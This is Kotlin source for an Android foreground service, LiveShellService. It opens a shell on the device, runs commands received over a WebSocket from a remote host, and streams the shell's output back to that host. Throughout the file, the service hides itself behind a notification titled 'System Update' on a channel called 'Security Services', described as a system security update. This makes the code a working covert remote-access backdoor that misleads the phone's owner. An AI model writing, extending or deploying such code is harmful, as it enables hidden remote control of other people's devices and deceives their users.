package com.kaze.liveshell

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Base64
import android.util.Log
import org.json.JSONObject
import java.util.concurrent.Executors
import java.util.concurrent.ScheduledExecutorService
import java.util.concurrent.TimeUnit

class LiveShellService : Service(), WsConnection.Listener {
    companion object {
        const val CHANNEL_ID = "liveshell_channel"
        const val NOTIFICATION_ID = 9999
        const val EXTRA_HOST = "host"
        const val EXTRA_DEVICE_ID = "device_id"
        const val EXTRA_TOKEN = "token"
    }

    private var wsConnection: WsConnection? = null
    private var shellProcess: ShellProcess? = null
    private var scheduler: ScheduledExecutorService? = null
    private var sessionId: String? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, buildNotification("Connecting..."))
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val host = intent?.getStringExtra(EXTRA_HOST) ?: return stopSelf().let { START_NOT_STICKY }
        val deviceId = intent.getStringExtra(EXTRA_DEVICE_ID) ?: return stopSelf().let { START_NOT_STICKY }
        val token = intent.getStringExtra(EXTRA_TOKEN) ?: return stopSelf().let { START_NOT_STICKY }

        startShell()
        connectWebSocket(host, deviceId, token)

        return START_NOT_STICKY
    }

    private fun startShell() {
        shellProcess = ShellProcess()
        shellProcess?.start()
    }

    private fun connectWebSocket(host: String, deviceId: String, token: String) {
        wsConnection = WsConnection(host, deviceId, token, this)
        wsConnection?.connect()
    }

    override fun onConnected(sid: String) {
        sessionId = sid
        updateNotification("Shell active")
        startOutputReader()
        Log.d("LiveShell", "Connected, session=$sid")
    }

    override fun onMessage(msg: JSONObject) {
        when (msg.optString("type")) {
            "shell_input" -> {
                val data = String(Base64.decode(msg.getString("data"), Base64.DEFAULT))
                shellProcess?.write(data)
            }
            "shell_resize" -> {
                // Best-effort on Android
            }
        }
    }

    override fun onDisconnected(reason: String) {
        stopOutputReader()
        stopSelf()
        Log.d("LiveShell", "Disconnected: $reason")
    }

    private fun startOutputReader() {
        scheduler = Executors.newSingleThreadScheduledExecutor()
        scheduler?.scheduleAtFixedRate({
            try {
                val stdout = shellProcess?.readStdout()
                if (!stdout.isNullOrEmpty()) {
                    wsConnection?.send(JSONObject().apply {
                        put("type", "shell_output")
                        put("session_id", sessionId)
                        put("stream", "stdout")
                        put("data", Base64.encodeToString(stdout.toByteArray(), Base64.DEFAULT))
                    })
                }
                val stderr = shellProcess?.readStderr()
                if (!stderr.isNullOrEmpty()) {
                    wsConnection?.send(JSONObject().apply {
                        put("type", "shell_output")
                        put("session_id", sessionId)
                        put("stream", "stderr")
                        put("data", Base64.encodeToString(stderr.toByteArray(), Base64.DEFAULT))
                    })
                }
                if (shellProcess?.isAlive() != true) {
                    wsConnection?.send(JSONObject().apply {
                        put("type", "shell_exit")
                        put("session_id", sessionId)
                        put("code", -1)
                    })
                    stopSelf()
                }
            } catch (e: Exception) {
                Log.e("LiveShell", "Output read error", e)
            }
        }, 0, 50, TimeUnit.MILLISECONDS)
    }

    private fun stopOutputReader() {
        scheduler?.shutdownNow()
        scheduler = null
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Security Services",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "System security update"
                setShowBadge(false)
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun buildNotification(text: String): Notification {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("System Update")
                .setContentText(text)
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .setOngoing(true)
                .build()
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this)
                .setContentTitle("System Update")
                .setContentText(text)
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .setOngoing(true)
                .build()
        }
    }

    private fun updateNotification(text: String) {
        val nm = getSystemService(NotificationManager::class.java)
        nm.notify(NOTIFICATION_ID, buildNotification(text))
    }

    override fun onDestroy() {
        stopOutputReader()
        wsConnection?.close()
        shellProcess?.destroy()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
